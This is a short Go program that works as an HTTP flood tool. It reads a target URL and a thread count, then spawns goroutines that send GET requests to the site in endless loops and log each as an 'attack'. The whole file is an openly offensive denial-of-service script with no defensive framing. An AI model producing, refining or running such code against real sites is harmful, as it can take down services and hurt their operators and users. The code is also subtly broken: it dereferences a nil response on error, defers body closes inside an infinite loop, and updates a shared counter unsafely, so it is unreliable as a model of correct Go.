package main

import (
	"fmt"
	"net/http"
	"bufio"
	"log"
	"os"
	"strconv"
	"strings"
)

var counter = 0

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter site url: ")
	urlString, _ := reader.ReadString('\n')
	urlString = strings.TrimSuffix(urlString, "\n")

	fmt.Print("Enter number of streams: ")
	streamsString, _ := reader.ReadString('\n')
	streamsString = strings.TrimSuffix(streamsString, "\n")
	streams, _ := strconv.Atoi(streamsString)
	log.Println("Streams:", streams)

	sum := 1
	for sum < streams {
		go storm(urlString)
		log.Println("Goroutine was created with number:", sum)
		sum += 1
	}

	storm(urlString)
}

func storm(url string) {
	for {
		log.Println("Start attack to url:", url)
		resp, err := http.Get(url)
		if err != nil {
			log.Println("Got error code from site:", resp.Status)
			return
		} else {
			log.Println("Success attack:", resp.Status)
		}
		defer resp.Body.Close()
		counter += 1
		log.Println("Number of attack:", counter)
	}
}
